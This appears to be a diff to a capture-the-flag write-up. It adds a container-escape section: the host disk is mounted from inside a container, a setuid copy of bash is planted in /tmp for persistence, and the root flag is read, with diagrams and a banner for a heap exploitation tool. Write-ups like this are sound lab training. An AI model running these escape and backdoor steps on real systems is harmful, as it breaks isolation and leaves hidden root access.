@@ -291,8 +291,34 @@ cat user.txt
 ```
 
 **Root.txt (after mounting host filesystem):**
+```bash
+1. Set up mount point
+   $ mkdir /mnt/host
+   $ mount /dev/nvme0n1p1 /mnt/host
+
+2. Copy rootbash for persistence
+   $ cp /mnt/host/bin/bash /mnt/host/tmp/rootbash
+   $ chmod +s /mnt/host/tmp/rootbash
+
+3. Extract flags
+   $ cat /mnt/host/root/root.txt
+   THM{final-boss_defeat3d-yay}
 
 ```
+### Visualization
+```
+BEFORE MOUNT
+────────────────────────────────────────────────────────
+
+   ┌────────────────────────┐        ┌────────────────────────┐
+   │        HOST SYSTEM     │        │        CONTAINER       │
+   │────────────────────────│        │────────────────────────│
+   │  /root/                │   ✖    │  /root/                │
+   │   └── root.txt   ✓     │  BLOCK │   └── (empty)     ✗    │
+   │                        │        │                        │
+   └────────────────────────┘        └────────────────────────┘
+
+
 AFTER MOUNT
 ────────────────────────────────────────────────────────
 
@@ -300,7 +326,7 @@ AFTER MOUNT
    │        HOST SYSTEM     │        │        CONTAINER       │
    │────────────────────────│        │────────────────────────│
    │  /root/                │        │  /mnt/host/            │
-   │   └── root.txt   ✓     │◄───────┼───└── /root/            │
+   │   └── root.txt   ✓     │◄───────┼───└── /root/           │
    │                        │ BRIDGE │        └── root.txt ✓  │
    └────────────────────────┘        └────────────────────────┘
 ```
@@ -335,7 +361,7 @@ BANNER = r"""
 ║      ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║    ║
 ║      ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    ║
 ║                                                            ║
-║    Heap Exploitation + FSOP RCE | Root Flag Capture      ║
+║    Heap Exploitation + FSOP RCE | Root Flag Capture        ║
 ║                                                            ║
 ╚════════════════════════════════════════════════════════════╝
 """
